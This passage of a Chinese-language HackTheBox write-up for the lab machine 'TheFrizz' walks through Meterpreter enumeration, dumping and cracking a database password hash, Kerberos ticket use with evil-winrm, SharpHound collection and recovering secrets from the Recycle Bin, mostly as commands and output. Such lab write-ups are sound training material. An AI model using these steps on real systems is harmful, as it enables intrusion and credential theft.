8\nMeterpreter     : x64/windows\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emeterpreter \u003e ipconfig\n\nInterface  1\n============\nName         : Software Loopback Interface 1\nHardware MAC : 00:00:00:00:00:00\nMTU          : 4294967295\nIPv4 Address : 127.0.0.1\nIPv4 Netmask : 255.0.0.0\nIPv6 Address : ::1\nIPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff\n\nInterface  5\n============\nName         : vmxnet3 Ethernet Adapter\nHardware MAC : 00:50:56:b9:e0:3d\nMTU          : 1500\nIPv4 Address : 10.10.11.60\nIPv4 Netmask : 255.255.254.0\nIPv6 Address : dead:beef::74cf:55b5:140b:9cb9\nIPv6 Netmask : ffff:ffff:ffff:ffff::\nIPv6 Address : fe80::4fb:be40:ce61:9c2a\nIPv6 Netmask : ffff:ffff:ffff:ffff::\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emeterpreter \u003e getuid\nServer username: frizz\\w.Webservice\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eC:\\xampp\\htdocs\\Gibbon-LMS\u003enet user\nnet user\n\nUser accounts \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \\\\FRIZZDC\n\n-------------------------------------------------------------------------------\na.perlstein              Administrator            c.ramon                  \nc.sandiego               d.hudson                 f.frizzle                \ng.frizzle                Guest                    h.arm                    \nJ.perlstein              k.franklin               krbtgt                   \nl.awesome                m.ramon                  M.SchoolBus              \np.terese                 r.tennelli               t.wright                 \nv.frizzle                w.li                     w.Webservice             \nThe \u003cspan class=\"hljs-built_in\"\u003ecommand\u003c/span\u003e completed successfully.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eC:\\xampp\\htdocs\\Gibbon-LMS\u003e\u003cspan class=\"hljs-built_in\"\u003ewhoami\u003c/span\u003e /priv\n\u003cspan class=\"hljs-built_in\"\u003ewhoami\u003c/span\u003e /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State   \n============================= ============================== ========\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled \nSeCreateGlobalPrivilege       Create global objects          Enabled \nSeIncreaseWorkingSetPrivilege Increase a process working \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e Disabled\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eC:\\xampp\\htdocs\\Gibbon-LMS\u003ewmic useraccount get /all\nwmic useraccount get /all\nAccountType  Caption              Description                                               Disabled  Domain  FullName               InstallDate  LocalAccount  Lockout  Name           PasswordChangeable  PasswordExpires  PasswordRequired  SID                                             SIDType  Status    \n512          frizz\\Administrator  Built-\u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e account \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e administering the computer/domain    FALSE     frizz                                       FALSE         FALSE    Administrator  TRUE                TRUE             TRUE              S-1-5-21-2386970044-1145388522-2932701813-500   1        OK        \n512          frizz\\Guest          Built-\u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e account \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e guest access to the computer/domain  TRUE      frizz                                       FALSE         FALSE    Guest          TRUE                FALSE            FALSE             S-1-5-21-2386970044-1145388522-2932701813-501   1        Degraded  \n512          frizz\\krbtgt         Key Distribution Center Service Account                   TRUE      frizz                                       FALSE         FALSE    krbtgt         TRUE                TRUE             TRUE              S-1-5-21-2386970044-1145388522-2932701813-502   1        Degraded  \n512          frizz\\f.frizzle      Wizard \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e Training                                        FALSE     frizz   fiona frizzle                       FALSE         FALSE    f.frizzle      TRUE                FALSE            TRUE              S-1-5-21-2386970044-1145388522-2932701813-1103  1        OK        \n512          frizz\\w.li           Student                                                   FALSE     frizz   wanda li                            FALSE         FALSE    w.li           TRUE                FALSE            TRUE              S-1-5-21-2386970044-1145388522-2932701813-1104  1        OK        \n512          frizz\\h.arm          Student                                                   FALSE     frizz   harry arm                           FALSE         FALSE    h.arm          TRUE                FALSE            TRUE              S-1-5-21-2386970044-1145388522-2932701813-1105  1        OK        \n512          frizz\\M.SchoolBus    Desktop Administrator                                     FALSE     frizz   Marvin SchoolBus                    FALSE         FALSE    M.SchoolBus    TRUE                FALSE            TRUE              S-1-5-21-2386970044-1145388522-2932701813-1106  1        OK        \n512          frizz\\d.hudson       Student                                                   FALSE     frizz   dorothy hudson                      FALSE         FALSE    d.hudson       TRUE                FALSE            TRUE              S-1-5-21-2386970044-1145388522-2932701813-1107  1        OK        \n512          frizz\\k.franklin     Student                                                   FALSE     frizz   keesha franklin                     FALSE         FALSE    k.franklin     TRUE                FALSE            TRUE              S-1-5-21-2386970044-1145388522-2932701813-1108  1        OK        \n512          frizz\\l.awesome      Student                                                   FALSE     frizz   liz awesome                         FALSE         FALSE    l.awesome      TRUE                FALSE            TRUE              S-1-5-21-2386970044-1145388522-2932701813-1109  1        OK        \n512          frizz\\t.wright       Student                                                   FALSE     frizz   tim wright                          FALSE         FALSE    t.wright       TRUE                FALSE            TRUE              S-1-5-21-2386970044-1145388522-2932701813-1110  1        OK        \n512          frizz\\r.tennelli     Student                                                   FALSE     frizz   ralphie tennelli                    FALSE         FALSE    r.tennelli     TRUE                FALSE            TRUE              S-1-5-21-2386970044-1145388522-2932701813-1111  1        OK        \n512          frizz\\J.perlstein    Student                                                   FALSE     frizz   Janet perlstein                     FALSE         FALSE    J.perlstein    TRUE                FALSE            TRUE              S-1-5-21-2386970044-1145388522-2932701813-1112  1        OK        \n512          frizz\\a.perlstein    Student                                                   FALSE     frizz   arnold perlstein                    FALSE         FALSE    a.perlstein    TRUE                FALSE            TRUE              S-1-5-21-2386970044-1145388522-2932701813-1113  1        OK        \n512          frizz\\p.terese       Student                                                   FALSE     frizz   phoebe terese                       FALSE         FALSE    p.terese       TRUE                FALSE            TRUE              S-1-5-21-2386970044-1145388522-2932701813-1114  1        OK        \n512          frizz\\v.frizzle      The Wizard                                                FALSE     frizz   valerie frizzle                     FALSE         FALSE    v.frizzle      TRUE                FALSE            TRUE              S-1-5-21-2386970044-1145388522-2932701813-1115  1        OK        \n512          frizz\\g.frizzle      Student                                                   FALSE     frizz   goldie frizzle                      FALSE         FALSE    g.frizzle      TRUE                FALSE            TRUE              S-1-5-21-2386970044-1145388522-2932701813-1116  1        OK        \n512          frizz\\c.sandiego     Student                                                   FALSE     frizz   carmen sandiego                     FALSE         FALSE    c.sandiego     TRUE                FALSE            TRUE              S-1-5-21-2386970044-1145388522-2932701813-1117  1        OK        \n512          frizz\\c.ramon        Student                                                   FALSE     frizz   carlos ramon                        FALSE         FALSE    c.ramon        TRUE                FALSE            TRUE              S-1-5-21-2386970044-1145388522-2932701813-1118  1        OK        \n512          frizz\\m.ramon        Student                                                   FALSE     frizz   mikey ramon                         FALSE         FALSE    m.ramon        TRUE                FALSE            TRUE              S-1-5-21-2386970044-1145388522-2932701813-1119  1        OK        \n512          frizz\\w.Webservice   Service \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e the website                                   FALSE     frizz   webservice Webservice               FALSE         FALSE    w.Webservice   TRUE                FALSE            TRUE              S-1-5-21-2386970044-1145388522-2932701813-1120  1        OK        \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e上传\u003ccode\u003eWinpeas\u003c/code\u003e进行信息收集，方便后面使用\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emeterpreter \u003e upload winPEASx64.exe\n[*] Uploading  : /root/Desktop/test/TheFrizz/winPEASx64.exe -\u003e winPEASx64.exe\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eC:\\xampp\\htdocs\\Gibbon-LMS\u003ewinPEASx64.exe \u003e info.txt\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emeterpreter \u003e download info.txt\n[*] Downloading: info.txt -\u003e /root/Desktop/test/TheFrizz/info.txt\n[*] Downloaded 351.36 KiB of 351.36 KiB (100.0%): info.txt -\u003e /root/Desktop/test/TheFrizz/info.txt\n[*] Completed  : info.txt -\u003e /root/Desktop/test/TheFrizz/info.txt\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e对敏感信息进行收集，找到数据库的账户和密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-variable\"\u003e$databaseServer\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e'localhost'\u003c/span\u003e;\n\u003cspan class=\"hljs-variable\"\u003e$databaseUsername\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e'MrGibbonsDB'\u003c/span\u003e;\n\u003cspan class=\"hljs-variable\"\u003e$databasePassword\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e'MisterGibbs!Parrot!?1'\u003c/span\u003e;\n\u003cspan class=\"hljs-variable\"\u003e$databaseName\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e'gibbon'\u003c/span\u003e;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e尝试Dump数据，但是当前\u003ccode\u003eshell\u003c/code\u003e没办法交互\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e mysql.exe -u MrGibbonsDB -p\u003cspan class=\"hljs-string\"\u003e\"MisterGibbs!Parrot!?1\"\u003c/span\u003e -e \u003cspan class=\"hljs-string\"\u003e\"show databases;\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e进入\u003ccode\u003epowershell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eC:\\xampp\\mysql\\bin\u003epowershell\npowershell\nWindows PowerShell\nCopyright (C) Microsoft Corporation. All rights reserved.\n\nInstall the latest PowerShell \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e new features and improvements! https://aka.ms/PSWindows\n\nPS C:\\xampp\\mysql\\bin\u003e \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e再次进行Dump数据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e ./mysql.exe -u MrGibbonsDB -p\u003cspan class=\"hljs-string\"\u003e\"MisterGibbs!Parrot!?1\"\u003c/span\u003e -e \u003cspan class=\"hljs-string\"\u003e\"show databases;\"\u003c/span\u003e\n atabase\ngibbon\ninformation_schema\n\u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e ./mysql.exe -u MrGibbonsDB -p\u003cspan class=\"hljs-string\"\u003e\"MisterGibbs!Parrot!?1\"\u003c/span\u003e -e \u003cspan class=\"hljs-string\"\u003e\"use gibbon;show tables;\"\u003c/span\u003e\n many data...but work...\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e./mysql.exe -u MrGibbonsDB -p\u003cspan class=\"hljs-string\"\u003e\"MisterGibbs!Parrot!?1\"\u003c/span\u003e -e \u003cspan class=\"hljs-string\"\u003e\"use gibbon;select * from gibbonperson;\"\u003c/span\u003e\ngibbonPersonID  title   surname firstName       preferredName   officialName    nameInCharacters        gender  username        passwordStrong  passwordStrongSalt      passwordForceReset      status  canLogin  gibbonRoleIDPrimary      gibbonRoleIDAll dob     email   emailAlternate  image_240       lastIPAddress   lastTimestamp   lastFailIPAddress       lastFailTimestamp       failCount       address1        address1District   address1Country address2        address2District        address2Country phone1Type      phone1CountryCode       phone1  phone3Type      phone3CountryCode       phone3  phone2Type      phone2CountryCode phone2   phone4Type      phone4CountryCode       phone4  website languageFirst   languageSecond  languageThird   countryOfBirth  birthCertificateScan    ethnicity       religion        profession      employer  jobTitle emergency1Name  emergency1Number1       emergency1Number2       emergency1Relationship  emergency2Name  emergency2Number1       emergency2Number2       emergency2Relationship  gibbonHouseID   studentID dateStart        dateEnd gibbonSchoolYearIDClassOf       lastSchool      nextSchool      departureReason transport       transportNotes  calendarFeedPersonal    viewCalendarSchool      viewCalendarPersonal    viewCalendarSpaceBooking   gibbonApplicationFormID lockerNumber    vehicleRegistration     personalBackground      messengerLastRead       privacy dayType gibbonThemeIDPersonal   gibboni18nIDPersonal    studentAgreements  googleAPIRefreshToken   microsoftAPIRefreshToken        genericAPIRefreshToken  receiveNotificationEmails       mfaSecret       mfaToken        cookieConsent   fields\n0000000001      Ms.     Frizzle Fiona   Fiona   Fiona Frizzle           Unspecified     f.frizzle       067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03        /aACFhikmNopqrRTVz2489  N       Full       Y       001     001     NULL    f.frizzle@frizz.htb     NULL    NULL    ::1     2024-10-29 09:28:59     10.10.16.70     2025-03-17 00:47:02     4                                                         NULL             NULL    NULL    NULL                                                    Y       Y       N       NULL                            NULL    NULL    NULL    NULL    NULL    NULL                      YNULL    NULL    NULL\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e拿到了\u003ccode\u003eFrizzle Fiona\u003c/code\u003e用户的密码\u003ccode\u003ehash\u003c/code\u003e和\u003ccode\u003esalt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e:067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03\nsalt:/aACFhikmNopqrRTVz2489\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e看着像是\u003ccode\u003esha-256\u003c/code\u003e ，尝试使用\u003ccode\u003ehashcat\u003c/code\u003e破解\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-TheFrizz/image50.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e将得到密码格式改为\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e破解，得到密码 \u003ccode\u003eJenni_Luvs_Magic23\u003c/code\u003e ，并且通过之前的信息可以知道是大概是域用户\u003ccode\u003ef.frizzle\u003c/code\u003e的凭据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ehashcat -m 1420 \u003cspan class=\"hljs-string\"\u003e\"067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489\"\u003c/span\u003e /usr/share/wordlists/rockyou.txt\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-TheFrizz/image51.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e枚举用户可用服务\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003e在上面使用的是新加坡节点，到这里使用 \u003ccode\u003eUS\u003c/code\u003e 的\u003ccode\u003eRelease Arena\u003c/code\u003e 节点，IP地址改为了\u003ccode\u003e10.129.224.51\u003c/code\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e我们再次扫描端口，可以发现使用了US节点后开启\u003ccode\u003e5985\u003c/code\u003e端口\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/TheFrizz  nmap -sT -min-rate 10000 -p- 10.129.224.5\n1\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-18 03:49 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e frizz.htb (10.129.224.51)\nHost is up (0.38s latency).\nNot shown: 65516 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n22/tcp    open  ssh\n53/tcp    open  domain\n80/tcp    open  http\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用密码尝试\u003ccode\u003eSMB\u003c/code\u003e，\u003ccode\u003eWinRM\u003c/code\u003e等服务无果\u003c/p\u003e\n\u003cp\u003e想起来之前有个信息，在WEB渗透前期得到的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\nWelcome\n\n*NOTICE** Due to unplanned Pentesting by students, WES is migrating applications and tools to stronger security protocols. During this transition, Ms. Fiona Frizzle will be migrating Gibbon to utilize our Azure Active Directory SSO. Please note this might take 48 hours \u003cspan class=\"hljs-built_in\"\u003ewhere\u003c/span\u003e your accounts will not be available. Please bear with us, and thank you \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e your patience. Anything that can not utilize Azure AD will use the strongest available protocols such as Kerberos.\n欢迎\n\n*注意** 由于学生进行计划外的渗透测试，WES 正在将应用程序和工具迁移到更强大的安全协议。在此过渡期间，Fiona Frizzle 女士将迁移 Gibbon 以利用我们的 Azure Active Directory SSO。请注意，这可能需要 48 小时，在此期间您的帐户将不可用。请耐心等待，感谢您的耐心。任何无法使用 Azure AD 的东西都将使用最强大的可用协议，例如 Kerberos。\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可能是需要使用\u003ccode\u003eKerberos\u003c/code\u003e协议进行认证\u003c/p\u003e\n\u003cp\u003e申请TGT票据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003entpdate -n firzzdc.frizz.htb\n\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e systemctl stop systemd-timesyncd\nntpdate -s 10.129.224.51\ngetTGT.py frizz.htb/f.frizzle:\u003cspan class=\"hljs-string\"\u003e'Jenni_Luvs_Magic23'\u003c/span\u003e -dc-ip frizzdc.frizz.htb\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-TheFrizz/image52.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e导入票据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e KRB5CCNAME=f.frizzle.ccache\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e还需要设置\u003ccode\u003eREALM\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e[domain_realm]\n    .frizz.htb = FRIZZ.HTB\n    frizz.htb = FRIZZ.HTB\n\n[libdefaults]\n    default_realm = FRIZZ.HTB\n    dns_lookup_realm = \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n    dns_lookup_kdc = \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n    ticket_lifetime = 24h\n    forwardable = \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n\n[realms]\n    FRIZZ.HTB = {\n        kdc = frizzdc.frizz.htb\n        admin_server = frizzdc.frizz.htb\n        default_domain = frizz.htb\n    }\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\nntpdate -s 10.10.11.60\n\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e evil-winrm -i frizzdc.frizz.htb -r frizz.htb -k f.frizzle.ccache\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e成功获得\u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/TheFrizz  ntpdate -s 10.129.224.51\n\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e evil-winrm -i frizzdc.frizz.htb -r frizz.htb -k f.frizzle.ccache\n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e is unimplemented on this machine\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nWarning: Useless cert/s provided, SSL is not enabled\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\f.frizzle\\Documents\u003e \u003cspan class=\"hljs-built_in\"\u003ewhoami\u003c/span\u003e\nfrizz\\f.frizzle\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e在当前目录下可以拿到user标志\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\f.frizzle\\Desktop\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e user.txt\n8fb10ca6761f988d8da6d5b41916ea65\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e提权 - M.SchoolBus\u003c/h2\u003e\n\u003cp\u003e尝试使用BloodHound使用\u003ccode\u003ef.frizzle\u003c/code\u003e收集的凭据进行分析\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\f.frizzle\\Desktop\u003e upload SharpHound.exe                                                                                            \n                                                                                                                                                             \nInfo: Uploading /root/Desktop/test/TheFrizz/SharpHound.exe to C:\\Users\\f.frizzle\\Desktop\\SharpHound.exe              \n                                                                              \nData: 1395368 bytes of 1395368 bytes copied    \n\n*Evil-WinRM* PS C:\\Users\\f.frizzle\\Desktop\u003e ./SharpHound.exe                                                                                                 \n2025-03-18T01:32:03.3495607-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound                                  \n2025-03-18T01:32:03.4746029-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTar\ngets, PSRemote                                                                                                                                               \n2025-03-18T01:32:03.5058237-07:00|INFORMATION|Initializing SharpHound at 1:32 AM on 3/18/2025                                                                \n2025-03-18T01:32:03.6464352-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e frizz.htb : frizzdc.frizz.htb                          \n2025-03-18T01:32:03.6777446-07:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote     \n2025-03-18T01:32:03.8496941-07:00|INFORMATION|Beginning LDAP search \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e frizz.htb                                                                            \n2025-03-18T01:32:03.9121449-07:00|INFORMATION|Producer has finished, closing LDAP channel                                                                    \n2025-03-18T01:32:03.9121449-07:00|INFORMATION|LDAP channel closed, waiting \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e consumers                                                                     \n2025-03-18T01:32:34.0527670-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 36 MB RAM                                                         \n2025-03-18T01:32:51.8339357-07:00|INFORMATION|Consumers finished, closing output channel                                                                     \n2025-03-18T01:32:51.8651850-07:00|INFORMATION|Output channel closed, waiting \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e output task to complete             \nClosing writers                                                               \n2025-03-18T01:32:52.0839376-07:00|INFORMATION|Status: 110 objects finished (+110 2.291667)/s -- Using 44 MB RAM                                              \n2025-03-18T01:32:52.0839376-07:00|INFORMATION|Enumeration finished \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 00:00:48.2359394                                                                       \n2025-03-18T01:32:52.1777023-07:00|INFORMATION|Saving cache with stats: 69 ID to \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e mappings.                                                               \n 69 name to SID mappings.                                                                                                                                    \n 0 machine sid mappings.                                                      \n 2 sid to domain mappings.                                                                                                                                   \n 0 global catalog mappings.                                                   \n2025-03-18T01:32:52.1933287-07:00|INFORMATION|SharpHound Enumeration Completed at 1:32 AM on 3/18/2025! Happy Graphing! \n\n*Evil-WinRM* PS C:\\Users\\f.frizzle\\Desktop\u003e download 20250318013251_BloodHound.zip\n                                        \nInfo: Downloading C:\\Users\\f.frizzle\\Desktop\\20250318013251_BloodHound.zip to 20250318013251_BloodHound.zip\n                                        \nInfo: Download successful!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e但是分析后没找到利用的方法，但是在回收站能找到有趣的东西…..(经提示)\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\f.frizzle\\Documents\u003e \u003cspan class=\"hljs-built_in\"\u003ecd\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'C:\\$Recycle.Bin\\S-1-5-21-2386970044-1145388522-2932701813-1103'\u003c/span\u003e\n\n*Evil-WinRM* PS C:\\\u003cspan class=\"hljs-variable\"\u003e$Recycle\u003c/span\u003e.Bin\\S-1-5-21-2386970044-1145388522-2932701813-1103\u003e \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e\n\n    Directory: C:\\\u003cspan class=\"hljs-variable\"\u003e$Recycle\u003c/span\u003e.Bin\\S-1-5-21-2386970044-1145388522-2932701813-1103\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----        10/29/2024   7:31 AM            148 \u003cspan class=\"hljs-variable\"\u003e$IE2XMEG\u003c/span\u003e.7z\n-a----        10/24/2024   9:16 PM       30416987 \u003cspan class=\"hljs-variable\"\u003e$RE2XMEG\u003c/span\u003e.7z\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e存在两个7z文件，转储出来\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\\u003cspan class=\"hljs-variable\"\u003e$Recycle\u003c/span\u003e.Bin\\S-1-5-21-2386970044-1145388522-2932701813-1103\u003e \u003cspan class=\"hljs-built_in\"\u003ecp\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'$IE2XMEG.7z'\u003c/span\u003e backup_1.7z\n*Evil-WinRM* PS C:\\\u003cspan class=\"hljs-variable\"\u003e$Recycle\u003c/span\u003e.Bin\\S-1-5-21-2386970044-1145388522-2932701813-1103\u003e \u003cspan class=\"hljs-built_in\"\u003ecp\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'$RE2XMEG.7z'\u003c/span\u003e backup_2.7z\n*Evil-WinRM* PS C:\\\u003cspan class=\"hljs-variable\"\u003e$Recycle\u003c/span\u003e.Bin\\S-1-5-21-2386970044-1145388522-2932701813-1103\u003e \u003cspan class=\"hljs-built_in\"\u003ecp\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'backup_1.7z'\u003c/span\u003e C:\\\u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e\\f.frizzle\\Documents\\\n*Evil-WinRM* PS C:\\\u003cspan class=\"hljs-variable\"\u003e$Recycle\u003c/span\u003e.Bin\\S-1-5-21-2386970044-1145388522-2932701813-1103\u003e \u003cspan class=\"hljs-built_in\"\u003ecp\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'backup_2.7z'\u003c/span\u003e C:\\\u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e\\f.frizzle\\Documents\\\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e转储出来后，发现\u003ccode\u003ebackup_1.7z\u003c/code\u003e无法解压\u003c/p\u003e\n\u003cp\u003e将\u003ccode\u003ebackup_1.7z\u003c/code\u003e 后缀名改为\u003ccode\u003etxt\u003c/code\u003e 再查看\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/TheFrizz  \u003cspan class=\"hljs-built_in\"\u003emv\u003c/span\u003e backup_1.7z backup_1.txt   \n⚡ root@kali  ~/Desktop/test/TheFrizz  \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e backup_1.txt      \n[ 2*\u0026#x3C;C:\\Users\\f.frizzle\\AppData\\Local\\Temp\\wapt-backup-sunday.7z# \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003ebackup_2.7z\u003c/code\u003e解压出是\u003ccode\u003ewapt\u003c/code\u003e的目录，查看其配置文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/TheFrizz/wapt  \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e conf/waptserver.ini\n[options]\nallow_unauthenticated_registration = True\nwads_enable = True\nlogin_on_wads = True\nwaptwua_enable = True\nsecret_key = ylPYfn9tTU9IDu9yssP2luKhjQijHKvtuxIzX9aWhPyYKtRO7tMSq5sEurdTwADJ\nserver_uuid = 646d0847-f8b8-41c3-95bc-51873ec9ae38\ntoken_secret_key = 5jEKVoXmYLSpi5F7plGPB4zII5fpx0cYhGKX5QC0f7dkYpYmkeTXiFlhEJtZwuwD\nwapt_password = IXN1QmNpZ0BNZWhUZWQhUgo=\nclients_signing_key = 